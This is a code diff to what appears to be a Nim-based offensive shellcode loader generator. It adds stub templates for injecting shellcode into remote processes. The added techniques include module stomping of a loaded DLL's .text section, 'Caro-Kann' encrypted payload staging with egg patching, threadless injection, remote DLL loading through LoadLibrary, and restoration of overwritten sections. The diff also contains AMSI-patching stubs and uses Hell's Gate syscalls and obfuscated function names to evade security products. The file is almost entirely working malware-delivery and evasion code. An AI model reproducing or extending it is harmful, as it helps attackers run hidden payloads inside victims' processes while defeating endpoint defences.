@@ -219,7 +219,7 @@ let ShellcodeRemoteInjectMapSection * = """
                     lpMapAddressRemote, 
                     NULL, FALSE, 0, 0, 0, NULL)
                 when defined(verbose):
-                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
+                    echo obf("[*] NtCreateThreadEx: "), toHex(status), " ", repr(lpMapAddressRemote)
 
     injectCreateRemoteThread(enctext) 
 
@@ -299,7 +299,7 @@ let ShellcoderemoteinjectStub * = """
                 when defined(verbose):
                     echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
                     if (status == 0):
-                        echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
+                        echo obf("[+] Permissions changed to PAGE_EXECUTE_READ"), repr(ds)
                 if(status != 0):
                     quit(1)
 
@@ -312,7 +312,7 @@ let ShellcoderemoteinjectStub * = """
 
             status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,ds,NULL, FALSE, 0, 0, 0, NULL)
             when defined(verbose):
-                echo obf("[*] NtCreateThreadEx: "), toHex(status)
+                echo obf("[*] NtCreateThreadEx: "), toHex(status), " ", repr(ds)
             
             when defined(JmpEntry):
                 Sleep(1000)
@@ -346,7 +346,6 @@ let ShellcoderemoteinjectStub * = """
                 else:
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
-            
 
             var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
         
@@ -365,9 +364,79 @@ let ShellcoderemoteinjectStub * = """
                     when defined(verbose):
                         echo obf("[+] DripAllocation Success!")
             else:
-                status = NtAllocateVirtualMemory(tProcess, &ds, 0, &sc_size,MEM_COMMIT,protectionValue)
-                when defined(verbose):
-                    echo obf("[*] NtAllocateVirtualMemory: "), status
+
+                when defined(stomb):
+                    when defined(verbose):
+                        echo obf("\r\n[*] Injecting DLL: "), stombDll, " into the remote process"
+                    
+                    if(remoteLoadDll(DLLPATH, tProcess)):
+                        when defined(verbose):
+                            echo obf("[+] DLL injected successfully")
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] DLL injection failed")
+                        quit(1)
+                    
+                    var module = GetRemoteModuleHandle(tProcess, stombDll)
+                    when defined(verbose):
+                        echo obf("[*] Using "), stombDll, obf(" .text section as shellcode buffer")
+                        echo obf("[*] Found baseAddress at: "), repr(module)
+                    
+                    ds = GetRemoteProcAddress(tProcess, module, stombFunc)
+                    rPtr2 = ds
+                    when defined(verbose):
+                        echo obf("[*] Found "), stombFunc, obf(" address at: "), repr(ds)
+
+
+                    var allocationSize: SIZE_T = cast[SIZE_T](sc_size) + 0x1000
+                        
+                    when defined(restore):
+                        var textStart: LPVOID = cast[LPVOID](module) + 0x1000 # .text section always starts at this offset to the base address
+                        var mbi: MEMORY_BASIC_INFORMATION
+                        var sectionSize: SIZE_T = VirtualQueryEx(tProcess, textStart, addr mbi, sizeof(mbi))
+                        when defined(verbose):
+                            echo obf("[*] VirtualQueryEx result: "), sectionSize
+                            echo obf("[*] Section size: "), mbi.RegionSize
+                        
+                        var originalRXSection: seq[byte] = newSeq[byte](mbi.RegionSize)
+                        var numberOfBytesRead: SIZE_T
+                        
+                        when defined(Hellsgate):
+                            if getSyscall(ntReadTable):
+                                syscall = ntReadTable.wSysCall
+                            else:
+                                when defined(verbose):
+                                    echo obf("[-] Failed to find opcode for NtReadVirtualMemory")
+
+                        status = NtReadVirtualMemory(tProcess, textStart, unsafeAddr originalRXSection[0], mbi.RegionSize, addr numberOfBytesRead)
+                        when defined(verbose):
+                            if (status == 0):
+                                echo obf("[+] ReadProcessMemory success!")
+                            else:
+                                echo obf("[-] Failed to read the original RX section")
+                                quit(1)
+
+                    when defined(Hellsgate):
+                        if getSyscall(ntProtectTable):
+                            syscall = ntProtectTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                    var protAddress: LPVOID = ds
+                    var oProtect: DWORD
+                    status = NtProtectVirtualMemory(tProcess, addr protAddress, addr allocationSize, PAGE_READWRITE, addr oProtect)
+                    when defined(verbose):
+                        if (status == 0):
+                            echo obf("[+] NtProtectVirtualMemory success! "), repr(protAddress)
+                        else:
+                            echo obf("[-] NtProtectVirtualMemory failed! "), repr(protAddress)
+                            quit(1)
+                        echo "[*] Buffer address: ", repr(ds)
+
+                else:
+                    status = NtAllocateVirtualMemory(tProcess, &ds, 0, &sc_size,MEM_COMMIT,protectionValue)
+                    when defined(verbose):
+                        echo obf("[*] NtAllocateVirtualMemory: "), status
             
             var bytesWritten: SIZE_T
             
@@ -393,7 +462,6 @@ let ShellcoderemoteinjectStub * = """
                     echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                 HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
             
-
             when not defined(AllocateDripStyle):
                 ptrEncText = cast[ptr byte](addr encText[0])
                 ptrDecText = cast[ptr byte](addr decText[0])
@@ -411,32 +479,327 @@ let ShellcoderemoteinjectStub * = """
                     echo obf("    \\-- bytes written: "), bytesWritten
                     echo obf("")
                 
-                when defined(RX):
-                    when defined(Hellsgate):
-                        if getSyscall(ntProtectTable):
-                            syscall = ntProtectTable.wSysCall
-                        else:
+                when not defined(carokann):
+                    when defined(RX):
+                        when defined(Hellsgate):
+                            if getSyscall(ntProtectTable):
+                                syscall = ntProtectTable.wSysCall
+                            else:
+                                when defined(verbose):
+                                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                        when defined(sleepinbetween):
                             when defined(verbose):
-                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
-                    when defined(sleepinbetween):
+                                echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
+                            HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+                        
+                        status = NtProtectVirtualMemory(tProcess, &ds, &sc_size, PAGE_EXECUTE_READ, addr oldProtection)
                         when defined(verbose):
-                            echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
-                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
-                    
-                    status = NtProtectVirtualMemory(tProcess, &ds, &sc_size, PAGE_EXECUTE_READ, addr oldProtection)
-                    when defined(verbose):
-                        echo obf("[*] NtProtectVirtualMemory: "), status
-                        if (status == 0):
-                            echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
-                    if(status != 0):
-                        quit(1)
+                            echo obf("[*] NtProtectVirtualMemory: "), status
+                            if (status == 0):
+                                echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
+                        if(status != 0):
+                            quit(1)
                 
                 when not defined(RX):
                     when defined(sleepinbetween):
                         when defined(verbose):
                             echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                         HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+
+            when defined(carokann):
+                when not defined(stomb):
+                    var rPtr2: LPVOID
+                var protectAddress: LPVOID = ds
+                var oldProtect: DWORD
+                when defined(JmpEntry):
+                    var tempdsAddress = ds
+                    ds = newEntry
+
+                const hookShellcode = slurp"decryptprotect.bin.tmp"
+
+                var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
+
+                var hook_sc_size: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len)
+
+                #var rPtr2: LPVOID
+
+                when defined(verbose):
+                    echo  obf("[*] Allocating memory for our custom shellcode, which will decrypt and re-protect")
+                
+
+                when defined(stomb):
+                    when defined(verbose):
+                        echo obf("[*] Using "), stombDll, obf(" .text section as shellcode buffer")
+                        echo obf("[*] Found baseAddress at: "), repr(rPtr2)
+                    #rPtr2 = getTextSectionStart(rPtr2)
+                    rPtr2 = GetRemoteProcAddress(tProcess, module, stombFunc2)
+                    #rPtr2 = rPtr2
+                    when defined(verbose):
+                        echo obf("[*] Found "), stombFunc2, obf(" address at: "), repr(rPtr2)
+                    
+                    protectAddress = rPtr2
+                    # as the function won't start at the section start, the protectAddress will have an
+                    # offset to the address where we write the shellcode later on. This could lead to a problem,
+                    # if the shellcode is too big and the function is not at the end of the section. 
+                    # So we need to calculate the difference between the section start and the function start and may need to protect one more section
+                    # Or we just allocate one more 4kB page so make sure the offset is no problem
+                    var allocateSize: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len) + 0x1000
+                    status = NtProtectVirtualMemory(tProcess, addr protectAddress, addr allocateSize, PAGE_READWRITE, addr oldProtect)
+                    when defined(verbose):
+                        if (status == 0):
+                            echo obf("[+] NtProtectVirtualMemory success! "), repr(protectAddress)
+                        else:
+                            echo obf("[-] NtProtectVirtualMemory failed! "), repr(protectAddress)
+                            quit(1)
+
+                else:
+                    when defined(Hellsgate):
+                        if getSyscall(ntAllocTable):
+                            syscall = ntAllocTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+
+                    status = NtAllocateVirtualMemory(
+                        tProcess,
+                        addr rPtr2,
+                        0,
+                        addr hook_sc_size,
+                        MEM_COMMIT or MEM_RESERVE,
+                        PAGE_READWRITE)
+                    when defined(verbose):
+                        if (status == 0):
+                            echo obf("[+] NtAllocateVirtualMemory for Caro-Kann shellcode success "), repr(rPtr2)
+                        else:
+                            echo obf("[-] NtAllocateVirtualMemory for Caro-Kann shellcode failed "), repr(rPtr2)
+                            quit(1)
+
+                # The shellcode contains two eggs, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88 and 0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x41, 0xFF, 0xE2. Now we want to replace the first egg with the value of
+                # the newly allocated memory address rptr, and we also want to replace the 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 with the address of the newly allocated memory address
+
+                var eggIndex = 0
+
+                when defined(verbose):
+                    echo obf("-------------------------------------------------------------")
+                    echo obf("[*] Looking for the egg, which will be filled with the first shellcodes memory address"), repr(ds)
+
+                for i in 0 ..< hookShellcodeBytes.len:
+                    if (hookShellcodeBytes[i] == 0x88) and (hookShellcodeBytes[i+1] == 0x88) and (hookShellcodeBytes[i+2] == 0x88) and (hookShellcodeBytes[i+3] == 0x88) and (hookShellcodeBytes[i+4] == 0x88) and (hookShellcodeBytes[i+5] == 0x88):
+                        when defined(verbose):
+                            echo obf("[*] Found egg at index: "), i
+                        eggIndex = i
+                        break
+
+                when defined(verbose):
+                    echo obf("[*] Writing allocated memory address into egg")
+
+                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr ds, 8)
+
+                when defined(verbose):
+                    echo obf("[*] Done.")
+
+                # and we also want to replace the 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 with the address of the newly allocated memory address
+
+
+                when defined(verbose):
+                    echo obf("-------------------------------------------------------------")
+                    echo obf("[*] Looking for the second egg, which will be filled the same address but to jump there at the end")
+
+                eggIndex = 0
+
+                for i in 0 ..< hookShellcodeBytes.len:
+                    if (hookShellcodeBytes[i] == 0x49) and (hookShellcodeBytes[i+1] == 0xBA) and (hookShellcodeBytes[i+2] == 0x00) and (hookShellcodeBytes[i+3] == 0x00) and (hookShellcodeBytes[i+4] == 0x00) and (hookShellcodeBytes[i+5] == 0x00) and (hookShellcodeBytes[i+6] == 0x00) and (hookShellcodeBytes[i+7] == 0x00) and (hookShellcodeBytes[i+8] == 0x00) and (hookShellcodeBytes[i+9] == 0x00) and (hookShellcodeBytes[i+10] == 0x41) and (hookShellcodeBytes[i+11] == 0xFF) and (hookShellcodeBytes[i+12] == 0xE2):
+                        when defined(verbose):
+                            echo obf("[*] Found egg at index: "), i
+                        # our 0x00 bytes start at position three, so we need to add three to the index
+                        eggIndex = i + 2
+                        break
+
+                when defined(verbose):
+                    echo obf("[*] Writing memory address into the jump at the end")
+
+                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr ds, 8)
+
+                # There is another egg, 0xDE, 0xAD, 0x10, 0xAF - which we want to find and replace with the length of the first shellcode (calc64enc.bin)
+
+                
+                when defined(stomb):
+                    # We need to find and overwrite the egg 0x9999999999999999 with the address of the protectAddress, so that our shellcode knows where to re-protect
+                    eggIndex = 0
+                    when defined(verbose):
+                        echo obf("-------------------------------------------------------------")
+                        echo obf("[*] Looking for the fifth egg, which will be filled with the address of the memory address to re-protect")
+                    
+                    for i in 0 ..< hookShellcodeBytes.len:
+                        if (hookShellcodeBytes[i] == 0x99) and (hookShellcodeBytes[i+1] == 0x99) and (hookShellcodeBytes[i+2] == 0x99) and (hookShellcodeBytes[i+3] == 0x99) and (hookShellcodeBytes[i+4] == 0x99) and (hookShellcodeBytes[i+5] == 0x99) and (hookShellcodeBytes[i+6] == 0x99) and (hookShellcodeBytes[i+7] == 0x99):
+                            when defined(verbose):
+                                echo obf("[*] Found egg at index: "), i
+                            eggIndex = i
+                            break
+
+                    when defined(verbose):
+                        echo obf("[*] Writing memory address into the egg "), repr(protectAddress)
+                    copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr protectAddress, 8)
+
+
+
+                # Finally write the decryptprotect.bin shellcode into the remote process
+                
+                when defined(Hellsgate):
+                    if getSyscall(ntWriteTable):
+                        syscall = ntWriteTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+                status = NtWriteVirtualMemory(tProcess, rPtr2, unsafeAddr hookShellcodeBytes[0], hook_sc_size, addr bytesWritten)
+
+                if (status == 0):
+                    when defined(verbose):
+                        echo obf("[+] NtWriteVirtualMemory for Caro-Kann shellcode success! "), repr(rPtr2)
+                        echo obf("    \\-- bytes written: "), bytesWritten
+                        echo obf("")
+                else:
+                    when defined(verbose):
+                        echo obf("[-] NtWriteVirtualMemory for Caro-Kann shellcode failed "), repr(rPtr2) ," ",  toHex(status)
+                    quit(1)
+
+                # Setting permissions to RX via VirtualProtectEx
+
+                when defined(Hellsgate):
+                    if getSyscall(ntProtectTable):
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+                #var oldProtect: DWORD
+                protectAddress = rPtr2
+                status = NtProtectVirtualMemory(tProcess, addr protectAddress, addr hook_sc_size, PAGE_EXECUTE_READ, addr oldProtect)
+
+                if (status == 0):
+                    when defined(verbose):
+                        echo obf("[+] NtProtectVirtualMemory for Caro-Kann shellcode success! "), repr(protectAddress)
+                        echo obf("    \\-- old protection: "), oldProtect
+                        echo obf("")
+                else:
+                    when defined(verbose):
+                        echo obf("[-] NtProtectVirtualMemory for Caro-Kann shellcode failed!")
+                    quit(1)
+                ds = rPtr2
             
+            when defined(stomb):
+                # as the execute primitive should now execute our custom shellcode, we need to set ds to the address of the shellcode. 
+                # It will automatically jump to the regular shellcode after sleep, decryption and re-protect.
+                ds = rPtr2
+
+
+            when defined(restore): # void function
+                proc restoreText(): void =
+                    
+                    when defined(carokann):
+                        Sleep(12000)
+                    else:
+                        Sleep(200)
+                    
+                    when defined(verbose):
+                        echo obf("[*] Restoring original .text section")
+                    protectAddress = textStart
+                    allocateSize = mbi.RegionSize
+                    
+                    when defined(Hellsgate):
+                        if getSyscall(ntProtectTable):
+                            syscall = ntProtectTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+                    status = NtProtectVirtualMemory(tProcess, addr protectAddress, addr allocateSize, oldProtect, addr oldProtect)
+                    when defined(verbose):
+                        if (status == 0):
+                            echo obf("[+] NtProtectVirtualMemory success! "), repr(protectAddress)
+                        else:
+                            echo obf("[-] NtProtectVirtualMemory failed! "), repr(protectAddress)
+                            quit(1)
+                    
+                    when defined(Hellsgate):
+                        if getSyscall(ntWriteTable):
+                            syscall = ntWriteTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                    status = NtWriteVirtualMemory(tProcess, textStart, unsafeAddr originalRXSection[0], (mbi.RegionSize), addr bytesWritten)
+
+                    when defined(verbose):
+                        if (status == 0):
+                            echo obf("[+] NtWriteVirtualMemory success"), repr(textStart) 
+                        else:
+                            echo obf("[-] Failed to write the original RX section"), repr(textStart), toHex(status)
+                            quit(1)
+                    
+                    when defined(Hellsgate):
+                        if getSyscall(ntProtectTable):
+                            syscall = ntProtectTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+                    protectAddress = textStart
+                    allocateSize = mbi.RegionSize
+                    status = NtProtectVirtualMemory(tProcess, addr protectAddress, addr allocateSize, PAGE_EXECUTE_READ, addr oldProtect)
+                    when defined(verbose):
+                        if (status == 0):
+                            echo obf("[+] NtProtectVirtualMemory success! "), repr(protectAddress)
+                        else:
+                            echo obf("[-] NtProtectVirtualMemory failed! "), repr(protectAddress)
+                            quit(1)
+
+
+            when defined(threadless):
+                # Use GetRemoteModuleHandle and GetRemoteProcAddress to check for threadlessDLL and threadlessFunction
+                # if threadlessDLL == ntdll.dll we can also query the address from the local process as they are equal
+                var remoteProc: LPVOID
+                if(threadlessDLL == obf("ntdll.dll")):
+                    var localHandle = GetModuleHandle(threadlessDLL)
+                    if localHandle == 0:
+                        when defined(verbose):
+                            echo obf("[-] Failed to get handle for local "), threadlessDLL
+                        quit(1)
+                    var localProc = GetProcAddress(localHandle, threadlessFunction)
+                    if localProc == NULL:
+                        when defined(verbose):
+                            echo obf("[-] Failed to get address of "), threadlessFunction
+                        quit(1)
+                    when defined(verbose):
+                        echo obf("[*] Found address of "), threadlessFunction, obf(" at "), toHex(cast[HANDLE](localProc)), "\r\n"
+                    remoteProc = localProc
+                else:
+                    var remoteHandle = GetRemoteModuleHandle(tProcess, threadlessDLL)
+                    if remoteHandle == 0:
+                        when defined(verbose):
+                            echo obf("[-] Failed to get handle for "), threadlessDLL
+                        quit(1)
+                    remoteProc = GetRemoteProcAddress(tProcess, remoteHandle, threadlessFunction)
+                    if remoteProc == NULL:
+                        when defined(verbose):
+                            echo obf("[-] Failed to get address of "), threadlessFunction
+                        quit(1)
+                    when defined(verbose):
+                        echo obf("[*] Found address of "), threadlessFunction, obf(" at "), toHex(cast[HANDLE](remoteProc)), "\r\n"
+                
+                # Call threadlessThread with target process, shellcode address and targetFunction address
+                var threadlessSuccess: bool = threadlessThread(tProcess, ds, remoteProc)
+                if threadlessSuccess == false:
+                    when defined(verbose):
+                        echo obf("[-] Failed to create threadless thread")
+                    quit(1)
+                when defined(verbose):
+                    echo obf("[+] Threadless thread created successfully")
+                when defined(restore):
+                    restoreText()
+                quit(0)
+
+
             when defined(QueueAPC):
                 when defined(Hellsgate):
                     if getSyscall(ntQueueApcThreadTable):
@@ -458,6 +821,8 @@ let ShellcoderemoteinjectStub * = """
                     else:
                         when defined(verbose):
                             echo obf("[-] Failed to restore bytes!")
+                when defined(restore):
+                    restoreText()
 
             else:
                 when defined(Hellsgate):
@@ -477,7 +842,7 @@ let ShellcoderemoteinjectStub * = """
                     NULL, FALSE, 0, 0, 0, NULL)
                 
                 when defined(verbose):
-                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
+                    echo obf("[*] NtCreateThreadEx: "), toHex(status), " ", repr(ds)
                 
                 when defined(JmpEntry):
                     Sleep(1000)
@@ -487,14 +852,14 @@ let ShellcoderemoteinjectStub * = """
                     else:
                         when defined(verbose):
                             echo obf("[-] Failed to restore bytes!")
-
+                when defined(restore):
+                    restoreText()
                 when defined(Hellsgate):
                     if getSyscall(ntCloseTable):
                         syscall = ntCloseTable.wSysCall
                     else:
                         when defined(verbose):
                             echo obf("[-] Failed to find opcode for NtClose")
-
                 status = NtClose(tHandle)
                 status = NtClose(tProcess)
 
@@ -750,6 +1115,219 @@ let RemotePatchAMSIStub* = """
 
 """
 
+let RemoteLoadDllStub* = """
+
+    proc remoteLoadDll(moduletoInject: cstring, tProcess: HANDLE): bool =
+
+        var
+            regionSize: SIZE_T
+            ntStatus: NTSTATUS
+            ntcode: NTSTATUS
+            threadRoutine: PTHREAD_START_ROUTINE
+    
+        regionSize = 4096
+
+       
+        when defined(verbose):
+            echo obf("[*] Loading "), moduletoInject, obf(" in the remote process")
+
+        var tHandle: HANDLE
+        var ds: LPVOID
+        var status: NTSTATUS
+        var sc_size: SIZE_T = cast[SIZE_T](moduletoInject.len)
+
+        
+        when defined(SysWhispers):
+        
+            status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
+            when defined(verbose):
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", toHex(ds)
+            var bytesWritten: SIZE_T
+
+            status = oqiazasusjk(tProcess,ds,moduletoInject,sc_size-1,addr bytesWritten)
+
+            when defined(verbose):
+                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
+                echo obf("    \\-- bytes written: "), bytesWritten
+                echo obf("")
+
+            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(obf("Kernel32.dll")), obf("LoadLibraryA")));
+            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
+            status = zuatzuastdiasyy(tHandle)
+            if(status == 0):
+                return true
+            else:
+                return false
+        else:
+            
+            when defined(Hellsgate):
+                if getSyscall(ntAllocTable):
+                    syscall = ntAllocTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+
+            status = NtAllocateVirtualMemory(
+                tProcess, &ds, 0, &sc_size, 
+                MEM_COMMIT, 
+                PAGE_READWRITE)
+            when defined(verbose):
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", repr(ds)
+            var bytesWritten: SIZE_T
+
+            when defined(Hellsgate):
+                if getSyscall(ntWriteTable):
+                    syscall = ntWriteTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+            status = NtWriteVirtualMemory(
+                tProcess, 
+                ds, 
+                moduletoInject, 
+                sc_size-1, 
+                addr bytesWritten)
+
+            when defined(verbose):
+                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
+            when defined(verbose):
+                echo obf("    \\-- bytes written: "), bytesWritten
+                echo obf("")
+            
+            when defined(Hellsgate):
+                if getSyscall(ntProtectTable):
+                    syscall = ntProtectTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            
+            var oldProtect: DWORD
+            var targetAddress: LPVOID = ds
+            status = NtProtectVirtualMemory(
+                tProcess, 
+                addr targetAddress, 
+                &sc_size, 
+                PAGE_READONLY, 
+                addr oldProtect)
+            
+            when defined(DInvoke):
+                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
+            else:
+                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
+            
+
+            when defined(threadless):
+        
+                # Create a new thread starting at LoadLibraryW with the DLL name buffer address as parameter
+                # This will execute LoadLibraryW(L"DLLName") in the remote process
+                
+                var loadLibraryStk: array[32, byte] = [byte 0x55,               # PUSH RBP
+                0x48, 0x89, 0xE5,                                               # MOV RBP, RSP
+                0x48, 0x83, 0xEC, 0x30,                                         # SUB RSP, 0x30 : space needed for LoadLibrary to not fuck the stack
+                0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # MOV RCX, 0x0000000000000000  -> module name
+                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # MOV RAX, 0x0000000000000000  -> loadLibraryW address
+                0xFF, 0xD0,                                                     # CALL RAX
+                0xC9,                                                           # LEAVE
+                0xC3
+                ]
+
+                moveMemory(unsafeAddr loadLibraryStk[10], &ds, sizeof(DWORD64))
+                moveMemory(unsafeAddr loadLibraryStk[20], &pfnThreadRtn, sizeof(DWORD64))
+
+                var loadLibraryAddress : PVOID = nil
+                var pageSize: SIZE_T = 32 * sizeof(BYTE)
+                var szOutput: SIZE_T
+                
+                when defined(Hellsgate):
+                    if getSyscall(ntAllocTable):
+                        syscall = ntAllocTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+
+                ntcode = NtAllocateVirtualMemory(tProcess, &loadLibraryAddress, 0, &pageSize, MEM_COMMIT, PAGE_READWRITE)
+                if (ntcode == 0):
+                    when defined(verbose):
+                        echo "[+] Allocate memory for loadLibrary Shellcode success"
+                
+                when defined(Hellsgate):
+                    if getSyscall(ntWriteTable):
+                        syscall = ntWriteTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+                ntcode = NtWriteVirtualMemory(tProcess, loadLibraryAddress, unsafeAddr loadLibraryStk[0], pageSize, &szOutput)
+                if (ntcode == 0):
+                    when defined(verbose):
+                        echo "[+] Write Shellcode success"
+                
+                when defined(Hellsgate):
+                    if getSyscall(ntProtectTable):
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+                ntcode = NtProtectVirtualMemory(tProcess, &loadLibraryAddress, &pageSize, PAGE_EXECUTE_READ, cast[PDWORD](&szOutput))
+                if (ntcode == 0):
+                    when defined(verbose):
+                        echo "[+] Re-Protected to RX success"
+                when defined(verbose):
+                    echo "[+] LoadLibraryW shellcode written at : ", repr(loadLibraryAddress)
+
+                var remoteModHandle: HMODULE = GetRemoteModuleHandle(tProcess, threadlessDLL)
+                if (remoteModHandle == 0):
+                    when defined(verbose):
+                        echo "[-] Cannot retrieve module"
+                    return false
+
+                var threadlessRoutine: LPVOID = cast[LPVOID](GetRemoteProcAddress(tProcess, remoteModHandle, threadlessFunction))
+                when defined(verbose):
+                    echo "[*] Threadless routine: ", repr(threadlessRoutine)
+
+
+                var threadSuccess = threadlessThread(tProcess, loadLibraryAddress, threadlessRoutine)
+                when defined(verbose):
+                    echo "Threadless inject success: ", threadSuccess
+                
+
+                status = NtFreeVirtualMemory(tProcess, &loadLibraryAddress, &pageSize, MEM_DECOMMIT or MEM_RELEASE)
+                if (status == 0):
+                    when defined(verbose):
+                        echo "[+] Free memory success"
+                    else:
+                        when defined(verbose):
+                            echo "[-] Free memory failed"
+                Sleep(500)
+                return threadSuccess
+            else:
+
+                when defined(Hellsgate):
+                    if getSyscall(ntCreateTable):
+                        syscall = ntCreateTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+
+                status = NtCreateThreadEx(
+                    &tHandle, 
+                    THREAD_ALL_ACCESS, 
+                    NULL, 
+                    tProcess,
+                    pfnThreadRtn, 
+                    ds, FALSE, 0, 0, 0, NULL)
+                when defined(verbose):
+                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
+                status = NtClose(tHandle)
+                Sleep(500)
+                if(status == 0):
+                    return true
+                else:
+                    return false
+
+"""
 
 let RemoteLoadAMSIStub* = """
 
@@ -783,7 +1361,7 @@ let RemoteLoadAMSIStub* = """
 
             status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
             when defined(verbose):
-                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", toHex(ds)
             var bytesWritten: SIZE_T
 
             status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
@@ -826,7 +1404,7 @@ let RemoteLoadAMSIStub* = """
                 MEM_COMMIT, 
                 PAGE_READWRITE)
             when defined(verbose):
-                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", toHex(ds)
             var bytesWritten: SIZE_T
 
             when defined(Hellsgate):
@@ -1093,7 +1671,7 @@ let RemoteForceSleepStub* = """
         when defined(SysWhispers):
             status = oqiahsjynmxkla(targetProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
             when defined(verbose):
-                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", toHex(ds)
             var bytesWritten: SIZE_T
 
             status = oqiazasusjk(targetProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
@@ -1123,7 +1701,7 @@ let RemoteForceSleepStub* = """
                 MEM_COMMIT, 
                 PAGE_READWRITE)
             when defined(verbose):
-                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", toHex(ds)
             var bytesWritten: SIZE_T
 
             when defined(Hellsgate):
